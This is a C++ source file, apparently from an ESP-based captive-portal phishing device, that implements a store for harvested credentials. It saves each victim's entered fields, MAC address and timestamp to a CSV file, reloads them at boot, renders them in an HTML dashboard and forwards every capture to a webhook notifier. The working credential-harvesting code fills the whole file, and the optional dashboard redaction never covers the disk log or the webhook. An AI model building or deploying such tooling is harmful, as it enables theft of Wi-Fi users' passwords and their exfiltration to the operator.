#include "credential_store.h"
#include "../notifier.h"
#include "../config.h"

extern NotifierModule notifier;

static String redactField(const String& value) {
#if DASHBOARD_REDACT_CREDENTIALS
    if (value.length() == 0) return "";
    return "[redacted:" + String(value.length()) + "]";
#else
    return value;
#endif
}

CredentialStore::CredentialStore(int max_entries) {
    this->max_entries = max_entries;
    this->count = 0;
    this->credentials = new Credential[max_entries];
}

bool CredentialStore::addCredential(const String& template_name, const String& field1, const String& field2, const String& client_mac) {
    if (count >= max_entries) {
        // Desplazar entradas, eliminar la más antigua
        for (int i = 0; i < max_entries - 1; i++) {
            credentials[i] = credentials[i + 1];
        }
        count = max_entries - 1;
    }

    credentials[count].template_name = template_name;
    credentials[count].field1 = field1;
    credentials[count].field2 = field2;
    credentials[count].timestamp = formatTimestamp();
    credentials[count].client_mac = client_mac;

    appendToDisk(credentials[count]);

    // Push notification via webhook if configured
    notifier.notify(template_name, field1, field2, credentials[count].timestamp);

    count++;
    return true;
}

String CredentialStore::getCredentialsJSON() {
    StaticJsonDocument<4096> doc;
    JsonArray arr = doc.to<JsonArray>();

    for (int i = 0; i < count; i++) {
        JsonObject obj = arr.createNestedObject();
        obj["template"] = credentials[i].template_name;
        obj["field1"]   = redactField(credentials[i].field1);
        obj["field2"]   = redactField(credentials[i].field2);
        obj["time"]     = credentials[i].timestamp;
        obj["mac"]      = credentials[i].client_mac;
    }

    String output;
    serializeJson(doc, output);
    return output;
}

int CredentialStore::getCount() {
    return count;
}

void CredentialStore::clear() {
    count = 0;
    if (LittleFS.exists(CREDENTIALS_FILE)) {
        LittleFS.remove(CREDENTIALS_FILE);
    }
}

String CredentialStore::getHTMLTable() {
    if (count == 0) {
        return "<p style='color:#888;text-align:center;padding:20px;'>No hay credenciales capturadas</p>";
    }

    String html = "<table><thead><tr><th>Template</th><th>Campo 1</th><th>Campo 2</th><th>Hora</th><th>MAC</th></tr></thead><tbody>";

    for (int i = count - 1; i >= 0; i--) {
        html += "<tr>";
        html += "<td>" + credentials[i].template_name + "</td>";
        html += "<td>" + redactField(credentials[i].field1) + "</td>";
        html += "<td>" + redactField(credentials[i].field2) + "</td>";
        html += "<td>" + credentials[i].timestamp + "</td>";
        html += "<td>" + credentials[i].client_mac + "</td>";
        html += "</tr>";
    }

    html += "</tbody></table>";
    return html;
}

// ---------------------------------------------------------------------------
// Persistencia en LittleFS
// ---------------------------------------------------------------------------

void CredentialStore::appendToDisk(const Credential& c) {
    File f = LittleFS.open(CREDENTIALS_FILE, "a");
    if (!f) return;

    // Formato CSV: template,field1,field2,timestamp,mac
    // Las comas dentro de los campos se escapan con comillas dobles
    f.print("\""); f.print(c.template_name); f.print("\",");
    f.print("\""); f.print(c.field1);        f.print("\",");
    f.print("\""); f.print(c.field2);        f.print("\",");
    f.print("\""); f.print(c.timestamp);     f.print("\",");
    f.print("\""); f.print(c.client_mac);    f.println("\"");
    f.close();
}

void CredentialStore::loadFromDisk() {
    if (!LittleFS.exists(CREDENTIALS_FILE)) return;

    File f = LittleFS.open(CREDENTIALS_FILE, "r");
    if (!f) return;

    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;

        // Parsear CSV con campos entre comillas dobles
        String fields[5];
        int fieldIdx = 0;
        int pos = 0;
        int len = line.length();

        while (pos < len && fieldIdx < 5) {
            if (line[pos] == '"') {
                pos++; // saltar comilla de apertura
                int start = pos;
                while (pos < len && line[pos] != '"') pos++;
                fields[fieldIdx++] = line.substring(start, pos);
                pos++; // saltar comilla de cierre
                if (pos < len && line[pos] == ',') pos++; // saltar coma
            } else {
                int start = pos;
                while (pos < len && line[pos] != ',') pos++;
                fields[fieldIdx++] = line.substring(start, pos);
                if (pos < len) pos++; // saltar coma
            }
        }

        if (fieldIdx < 4) continue; // línea inválida

        if (count >= max_entries) {
            for (int i = 0; i < max_entries - 1; i++) {
                credentials[i] = credentials[i + 1];
            }
            count = max_entries - 1;
        }

        credentials[count].template_name = fields[0];
        credentials[count].field1        = fields[1];
        credentials[count].field2        = fields[2];
        credentials[count].timestamp     = fields[3];
        credentials[count].client_mac    = (fieldIdx >= 5) ? fields[4] : "";
        count++;
    }

    f.close();
}

// ---------------------------------------------------------------------------

#include <time.h>

String CredentialStore::formatTimestamp() {
    time_t now = time(nullptr);
    if (now > 1704067200UL) {  // NTP synced (> 2024-01-01)
        struct tm t;
        localtime_r(&now, &t);
        char buf[32];
        snprintf(buf, sizeof(buf), "%04d-%02d-%02d %02d:%02d:%02d",
                 t.tm_year + 1900, t.tm_mon + 1, t.tm_mday,
                 t.tm_hour, t.tm_min, t.tm_sec);
        return String(buf);
    }
    // Fallback: relative time since boot
    unsigned long secs = millis() / 1000;
    char buf[16];
    snprintf(buf, sizeof(buf), "T+%02lu:%02lu:%02lu",
             secs / 3600, (secs % 3600) / 60, secs % 60);
    return String(buf);
}
